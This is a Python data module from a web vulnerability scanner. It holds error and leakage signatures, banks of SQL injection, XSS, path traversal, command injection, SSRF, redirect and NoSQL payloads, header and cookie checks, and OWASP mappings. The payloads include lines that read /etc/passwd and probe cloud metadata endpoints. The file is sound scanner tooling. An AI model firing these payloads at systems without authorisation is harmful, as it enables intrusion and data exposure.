"""Error signatures, payload banks and framework knowledge.

Centralising these keeps modules small and lets the signatures be tuned in one
place. Every signature here has been chosen to be *specific* - a generic
"error" match is what turns a scanner into a noise generator.
"""

from __future__ import annotations

import re

#: Signatures that indicate a backend SQL error escaped to the client.
SQL_ERROR_SIGNATURES: list[tuple[str, str]] = [
    (r"you have an error in your sql syntax", "MySQL"),
    (r"warning.{0,40}\bmysqli?_\w+", "MySQL"),
    (r"warning.{0,40}\bpg_\w+", "PostgreSQL"),
    (r"unclosed quotation mark after the character string", "Microsoft SQL"),
    (r"quoted string not properly terminated", "Microsoft SQL"),
    (r"unterminated quoted string at or near", "PostgreSQL"),
    (r"sqlite3?::\w+:", "SQLite"),
    (r"sqlite_?\w*error", "SQLite"),
    (r"ora-\d{5}", "Oracle"),
    (r"sqlstate\[\w+\]", "PostgreSQL"),
    (r"microsoft ole db provider for sql server", "Microsoft SQL"),
    (r"syntax error at or near", "PostgreSQL"),
    (r"postgresql query failed", "PostgreSQL"),
    (r"mysql_fetch_(?:array|row)\(\): supplied argument is not a valid", "MySQL"),
    (r"valid mysql result", "MySQL"),
    (r"com\.microsoft\.sqlserver\.jdbc", "Microsoft SQL"),
    (r"\[sqlserver\]", "Microsoft SQL"),
    (r"odbc sql server driver", "Microsoft SQL"),
    (r"column .{1,40} does not exist", "PostgreSQL"),
    (r"table .{1,40} does not exist", "PostgreSQL"),
    (r"db2 sql error", "IBM Db2"),
    (r"pdoexception|pdo error", "PDO"),
    (r"sequel::database", "Sequel"),
    (r"hibernate.*exception", "Hibernate"),
    (r"java\.sql\.sqlexception", "JDBC"),
]

#: Signatures indicating command execution.
COMMAND_SIGNATURES: list[tuple[str, str]] = [
    (r"uid=\d+\([^)]*\)", "Unix id"),
    (r"root:x:0:0", "/etc/passwd"),
    (r"www-data", "www-data"),
    (r"command not found", "shell"),
    (r"sh:\s*\d+:", "shell"),
    (r"bash:\s*line\s*\d+", "shell"),
    (r"/bin/(?:ba)?sh", "shell"),
    (r"windows ip configuration", "Windows"),
    (r"volume in drive", "Windows"),
    (r"nslookup", "Windows"),
    (r"unable to resolve host", "resolver"),
    (r"socket\.connect", "Python"),
]

#: Signatures indicating a template engine evaluated our input.
TEMPLATE_SIGNATURES: list[tuple[str, str]] = [
    (r"jinja2\.exceptions|traceback \(most recent call last\)", "Jinja2"),
    (r"django\.template|exception while rendering", "Django"),
    (r"freemarker\.core\.nonparsingexception|freemarker", "FreeMarker"),
    (r"velocity|org\.apache\.velocity", "Velocity"),
    (r"thymeleaf|org\.thymeleaf", "Thymeleaf"),
    (r"erb|err\.undefined", "ERB"),
    (r"twing|twingerror", "Twig"),
    (r"unexpected end of template", "Handlebars"),
    (r"smarty|smarty.class", "Smarty"),
    (r"mustache", "Mustache"),
    (r"expr|ExpressionLanguage", "SpEL"),
]

#: Signatures indicating XXE processing.
XXE_SIGNATURES: list[tuple[str, str]] = [
    (r"root:x:0:0", "file disclosure"),
    (r"<!\[CDATA\[", "CDATA echo"),
    (r"unable to load xml|xml parser error|parse error in entity", "XML parser error"),
    (r"doctype is not allowed", "DTD rejection"),
    (r"external entity", "entity handling"),
]

#: Signatures indicating a directory listing.
DIRECTORY_LISTING_SIGNATURES: list[tuple[str, str]] = [
    (r"<title>index of /", "Apache-style listing"),
    (r"<h1>index of /", "nginx-style listing"),
    (r"parent directory", "listing footer"),
    (r"\?C=N;O=D", "Apache listing"),
]

#: Stack-trace / debug leakage signatures.
STACKTRACE_SIGNATURES: list[tuple[str, str]] = [
    (r"traceback \(most recent call last\)", "Python"),
    (r"at [\w.$]+\([\w]+\.java:\d+\)", "Java"),
    (r"\.java:\d+", "Java"),
    (r"\[(?:error|debug|info)\]\s+\w+", "Node/Express"),
    (r"ruby on rails.{0,40}exception|actioncontroller::", "Ruby on Rails"),
    (r"goroutine \d+ \[", "Go"),
    (r"System\.\w+Exception:|Microsoft \.NET Framework", ".NET"),
    (r"php (?:warning|fatal error|notice|parse error)", "PHP"),
    (r"org\.apache\.(?:jasper|struts|logging)", "Java"),
    (r"werkzeug\.exceptions|debugger", "Werkzeug"),
    (r"laravel\.framework", "Laravel"),
    (r"django\.core\.exceptions", "Django"),
    (r"panic: ", "Go/Rust"),
    (r"stack trace:", "generic"),
    (r"undefined variable|undefined index", "PHP/JS"),
    (r"sqlstate|odbc", "Database"),
]

#: Generous but specific injection payloads.
SQLI_PAYLOADS: list[str] = [
    "'",
    "''",
    "\"",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "1' OR 1=1--",
    "admin'--",
    "') OR ('1'='1",
    "1; SELECT 1--",
    "1 UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "1 AND pg_sleep(5)",
    "1' AND 1=CAST((SELECT version()) AS INT)--",
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND updatexml(1,concat(0x7e,version()),1)--",
    "1' ORDER BY 100--",
    "1' GROUP BY 1,2,3--",
]

#: Payloads that survive different output contexts.
XSS_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "javascript:alert(1)",
    "<a href=\"javascript:alert(1)\">x</a>",
    "\"><iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
]

#: Path traversal payloads.
TRAVERSAL_PAYLOADS: list[str] = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%1c..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",
    "/etc/passwd",
    "....\\\\....\\\\....\\\\etc\\\\passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "expect://id",
]

#: Command injection payloads (marker based so we can detect the output).
COMMAND_PAYLOADS: list[str] = [
    "; id",
    "| id",
    "&& id",
    "`id`",
    "$(id)",
    "; sleep 5",
    "| sleep 5",
    "; cat /etc/passwd",
    "& whoami",
    "| whoami",
    "&& hostname",
    "|| id",
    "; uname -a",
    "& ping -n 4 127.0.0.1",
    "| nslookup 127.0.0.1",
    "'; id",
    "'; cat /etc/passwd",
    "&& echo nemesis_marker",
]

#: SSRF probes. These target the scanner's own collaborator endpoint, or use
#: protocol handlers when no collaborator is configured.
SSRF_PAYLOADS: list[str] = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:11211/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.1/",
    "http://2130706433/",
    "http://localtest.me/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stat",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/latest/meta-data/",
]

#: Open redirect payloads.
REDIRECT_PAYLOADS: list[str] = [
    "https://example.com/",
    "//example.com/",
    "/\\example.com",
    "https:example.com",
    "http:example.com",
    "https:/\\example.com",
    "////example.com",
    "https://evil.example",
]

#: NoSQL injection probes.
NOSQL_PAYLOADS: list[str] = [
    "ne",
    "gt",
    "ne](",
    "$ne",
    '{"$ne": null}',
    '{"$gt": ""}',
    "true",
    "false",
    '{"$where": "1==1"}',
    "','",
    "%27",
]

#: Headers that should be present on a hardened web application.
SECURITY_HEADERS: list[tuple[str, str, str, str]] = [
    # (header, severity if missing, description, remediation)
    (
        "strict-transport-security",
        "medium",
        "Missing HSTS header allows SSL-strip downgrade attacks on first visit.",
        "Add `Strict-Transport-Security: max-age=31536000; includeSubDomains`.",
    ),
    (
        "content-security-policy",
        "medium",
        "No Content-Security-Policy leaves the app exposed to XSS and data injection.",
        "Deploy a restrictive CSP starting with `default-src 'self'`.",
    ),
    (
        "x-content-type-options",
        "low",
        "Missing `X-Content-Type-Options: nosniff` allows MIME-type confusion.",
        "Send `X-Content-Type-Options: nosniff` on all responses.",
    ),
    (
        "referrer-policy",
        "low",
        "Missing `Referrer-Policy` leaks full URLs to third parties.",
        "Set `Referrer-Policy: strict-origin-when-cross-origin`.",
    ),
    (
        "x-frame-options",
        "medium",
        "Missing clickjacking protection allows the page to be framed.",
        "Set `X-Frame-Options: DENY` or `frame-ancestors 'none'` in CSP.",
    ),
    (
        "permissions-policy",
        "info",
        "No Permissions-Policy; powerful browser features are unrestricted.",
        "Disable unused features via a Permissions-Policy header.",
    ),
    (
        "cross-origin-opener-policy",
        "info",
        "Missing COOP allows cross-origin window handles to be stolen.",
        "Set `Cross-Origin-Opener-Policy: same-origin`.",
    ),
    (
        "cross-origin-resource-policy",
        "info",
        "Missing CORP allows cross-origin reads of sensitive resources.",
        "Set `Cross-Origin-Resource-Policy: same-origin`.",
    ),
    (
        "x-xss-protection",
        "info",
        "Missing `X-XSS-Protection` (legacy browsers only).",
        "Enable `X-XSS-Protection: 1; mode=block` for legacy clients.",
    ),
]

#: Cookie attributes worth checking.
COOKIE_FLAGS: list[tuple[str, str, str]] = [
    ("Secure", "medium", "Cookie is transmitted over plain HTTP and can be intercepted."),
    ("HttpOnly", "medium", "Cookie is readable by JavaScript and is exposed to XSS."),
    ("SameSite", "low", "Cookie has no SameSite restriction, widening CSRF exposure."),
]

#: OWASP Top 10 (2021) mapping used in reports.
OWASP_TOP_10: dict[str, str] = {
    "A01": "A01:2021 - Broken Access Control",
    "A02": "A02:2021 - Cryptographic Failures",
    "A03": "A03:2021 - Injection",
    "A04": "A04:2021 - Insecure Design",
    "A05": "A05:2021 - Security Misconfiguration",
    "A06": "A06:2021 - Vulnerable and Outdated Components",
    "A07": "A07:2021 - Identification and Authentication Failures",
    "A08": "A08:2021 - Software and Data Integrity Failures",
    "A09": "A09:2021 - Security Logging and Monitoring Failures",
    "A10": "A10:2021 - Server-Side Request Forgery",
}

#: OWASP API Security Top 10 (2023).
OWASP_API_TOP_10: dict[str, str] = {
    "API1": "API1:2023 - Broken Object Level Authorization",
    "API2": "API2:2023 - Broken Authentication",
    "API3": "API3:2023 - Broken Object Property Level Authorization",
    "API4": "API4:2023 - Unrestricted Resource Consumption",
    "API5": "API5:2023 - Broken Function Level Authorization",
    "API6": "API6:2023 - Unrestricted Access to Sensitive Business Flows",
    "API7": "API7:2023 - Server Side Request Forgery",
    "API8": "API8:2023 - Security Misconfiguration",
    "API9": "API9:2023 - Improper Inventory Management",
    "API10": "API10:2023 - Unsafe Consumption of APIs",
}

#: Sibling OWASP categories that commonly pair with a primary category.
OWASP_SIBLINGS: dict[str, list[str]] = {
    "A01": ["API1", "API5"],
    "A05": ["API8"],
    "A07": ["API2"],
    "A10": ["API7"],
}


def match_signatures(
    text: str, signatures: list[tuple[str, str]], limit: int = 5
) -> list[tuple[str, str]]:
    """Return the first *limit* ``(signature_name, matched_text)`` pairs."""
    if not text:
        return []
    hits: list[tuple[str, str]] = []
    for pattern, label in signatures:
        match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if match:
            hits.append((label, match.group(0)[:200]))
            if len(hits) >= limit:
                break
    return hits
